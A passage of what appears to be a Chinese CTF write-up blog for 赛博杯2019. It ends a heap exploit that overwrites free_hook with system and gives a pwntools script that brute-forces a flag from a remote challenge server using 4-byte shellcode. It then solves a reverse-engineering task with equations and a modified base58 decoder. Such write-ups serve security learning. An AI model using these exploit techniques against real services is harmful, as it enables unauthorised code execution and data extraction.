add(0x20,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">    add(0x20,p64(system)+&apos;\n&apos;)</span><br><span class="line">    delete(7)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="90.png" alt="90"></p>
<h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;CRITICAL&apos;</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def flag_index(index):</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code):</span><br><span class="line"></span><br><span class="line">    sh.send(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content):</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(&apos;tell me your name size:\n&apos;)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(&apos;input your name:\n&apos;)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=open(&apos;./pwn4_flag&apos;,&apos;a+&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    for index in range(32):</span><br><span class="line"></span><br><span class="line">        for i in range(0x1,0x7f):</span><br><span class="line"></span><br><span class="line">            sh=remote(&apos;47.110.227.208&apos;,10004)</span><br><span class="line"></span><br><span class="line">            #sh=process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;this is my gift for you, take it!\n&apos;)</span><br><span class="line"></span><br><span class="line">            flag_index(index)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;input your code:\n&apos;)</span><br><span class="line"></span><br><span class="line">            code(&apos;AQX\xC3&apos;)</span><br><span class="line"></span><br><span class="line">            padding=&apos;a&apos;.ljust(i,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">            name(0x100,padding)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;Hello are you ready? &apos;+padding+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">            sh.sendline()</span><br><span class="line"></span><br><span class="line">            info = sh.recv()</span><br><span class="line"></span><br><span class="line">            if((info).find(&apos;bye!&apos;) != -1):</span><br><span class="line"></span><br><span class="line">                print  chr(i+0x16)</span><br><span class="line"></span><br><span class="line">                flag.write(chr(i+0x16))</span><br><span class="line"></span><br><span class="line">                sh.close()</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line"></span><br><span class="line">                sh.close()</span><br><span class="line"></span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<p><img src="87.png" alt="87"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>（emmm这一题偷懒了），</p>
<p>首先分析主函数</p>
<p>里面有两个check函数。进入checktime（）函数，关键代码是这里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> *(&amp;v5 + i) = rand();</span><br><span class="line">if ( 14766 * v11 + 18242 * v10 + 4657 * v9 + 22453 * v8 + 7236 * v7 + 28554 * v6 + 25606 * v5 + 12289 * v12 == 12977737</span><br><span class="line">  &amp;&amp; 27429 * v11 + 8015 * v10 + 16511 * v9 + 17180 * v8 + 27141 * v7 + 31813 * v6 + 7412 * v5 + 18249 * v12 == 15081473</span><br><span class="line">  &amp;&amp; 2846 * v11 + 28353 * v10 + 19864 * v9 + 27377 * v8 + 9006 * v7 + 13657 * v6 + 19099 * v5 + 25835 * v12 == 13554960</span><br><span class="line">  &amp;&amp; 1078 * v11 + 5007 * v10 + 6568 * v9 + 23034 * v8 + 10150 * v7 + 22949 * v6 + 32646 * v5 + 15255 * v12 == 11284005</span><br><span class="line">  &amp;&amp; 8010 * v11 + 15430 * v10 + 6657 * v9 + 1009 * v8 + 25691 * v7 + 15960 * v6 + 19493 * v5 + 29491 * v12 == 10759932</span><br><span class="line">  &amp;&amp; 4605 * v11 + 14468 * v10 + 5017 * v9 + 12805 * v8 + 22973 * v7 + 30584 * v6 + 12620 * v5 + 32085 * v12 == 12085266</span><br><span class="line">  &amp;&amp; 7478 * v11 + 6524 * v10 + 25994 * v9 + 16215 * v8 + 12864 * v7 + 20574 * v6 + 8882 * v5 + 14794 * v12 == 11323393</span><br><span class="line">  &amp;&amp; 15263 * v11 + 8821 * v10 + 25489 * v9 + 9598 * v8 + 26847 * v7 + 5175 * v6 + 6515 * v5 + 27411 * v12 == 11677607 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>一共8位字符，猜测前5位为<strong>flag{</strong>然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）</p>
<p>得到    flag{Th3</p>
<p>然后来到关键的check函数，看到这里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   for ( j = 0; !v12[j]; ++j )</span><br><span class="line">     ;</span><br><span class="line">   if ( j &gt;= v11 )</span><br><span class="line">     break;</span><br><span class="line">   v9 = 0;</span><br><span class="line">   while ( j &lt; v11 )</span><br><span class="line">   &#123;</span><br><span class="line">     v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">     v12[j] = v1 / 58;</span><br><span class="line">     v9 = v1 % 58;</span><br><span class="line">     ++j;</span><br><span class="line">   &#125;</span><br><span class="line">   v2 = v5++;</span><br><span class="line">   s[v2] = v9;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>再加上用来取值的table  123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy</p>
<p>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$encode = &quot;fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g&quot;;</span><br><span class="line">echo &quot;\n&quot;.$encode;</span><br><span class="line"></span><br><span class="line">$decode = base58_decode($encode);</span><br><span class="line">echo &quot;\n&quot;.$decode;</span><br><span class="line"></span><br><span class="line">function base58_encode($string)</span><br><span class="line">&#123;</span><br><span class="line">    $alphabet = &apos;123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ&apos;;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($string) === false || !strlen($string)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $bytes = array_values(unpack(&apos;C*&apos;, $string));</span><br><span class="line">    $decimal = $bytes[0];</span><br><span class="line">    for ($i = 1, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, 256);</span><br><span class="line">        $decimal = bcadd($decimal, $bytes[$i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $output = &apos;&apos;;</span><br><span class="line">    while ($decimal &gt;= $base) &#123;</span><br><span class="line">        $div = bcdiv($decimal, $base, 0);</span><br><span class="line">        $mod = bcmod($decimal, $base);</span><br><span class="line">        $output .= $alphabet[$mod];</span><br><span class="line">        $decimal = $div;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($decimal &gt; 0) &#123;</span><br><span class="line">        $output .= $alphabet[$decimal];</span><br><span class="line">    &#125;</span><br><span class="line">    $output = strrev($output);</span><br><span class="line"></span><br><span class="line">    return (string) $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function base58_decode($base58)</span><br><span class="line">&#123;</span><br><span class="line">    $alphabet = &apos;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&apos;;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($base58) === false || !strlen($base58)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    $indexes = array_flip(str_split($alphabet));</span><br><span class="line">    $chars = str_split($base58);</span><br><span class="line">    foreach ($chars as $char) &#123;</span><br><span class="line">        if (isset($indexes[$char]) === false) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $decimal = $indexes[$chars[0]];</span><br><span class="line">    for ($i = 1, $l = count($chars); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, $base);</span><br><span class="line">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span><br><span class="line">    &#125;</span><br><span class="line">    $output = &apos;&apos;;</span><br><span class="line">    while ($decimal &gt; 0) &#123;</span><br><span class="line">        $byte = bcmod($decimal, 256);</span><br><span class="line">        $output = pack(&apos;C&apos;, $byte).$output;</span><br><span class="line">        $decimal = bcdiv($decimal, 256, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<p>_sEcond_Be5t_Time_1s_n0w} </p>
<p>flag到手</p>
<p>后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/07/14/QWB/">All tags</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/07/14/赛博杯2019_Write_Up/">赛博杯2019_Write_Up</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>